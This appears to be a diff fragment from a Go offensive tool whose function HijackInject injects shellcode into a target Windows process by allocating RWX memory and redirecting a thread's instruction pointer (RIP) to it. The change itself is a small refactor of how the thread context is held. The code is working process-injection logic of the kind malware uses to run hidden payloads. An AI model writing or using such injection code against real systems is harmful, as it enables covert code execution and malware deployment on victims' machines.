@@ -77,17 +77,17 @@ func HijackInject(target string, shellcode []byte) error {
 	fmt.Printf("  [alloc]     0x%x (RWX, %d bytes)\n", addr, len(shellcode))
 
 	// Redirect RIP to shellcode
-	ctx, err := getThreadContext(thread)
+	ac, err := getThreadContext(thread)
 	if err != nil {
 		virtualFreeEx(pi.Process, addr)
 		windows.ResumeThread(thread)
 		windows.TerminateProcess(pi.Process, 1)
 		return err
 	}
-	fmt.Printf("  [original RIP] 0x%x\n", ctx.GetRip())
+	fmt.Printf("  [original RIP] 0x%x\n", ac.ctx.GetRip())
 
-	ctx.SetRip(uint64(addr))
-	if err := setThreadContext(thread, ctx); err != nil {
+	ac.ctx.SetRip(uint64(addr))
+	if err := setThreadContext(thread, ac); err != nil {
 		virtualFreeEx(pi.Process, addr)
 		windows.ResumeThread(thread)
 		windows.TerminateProcess(pi.Process, 1)
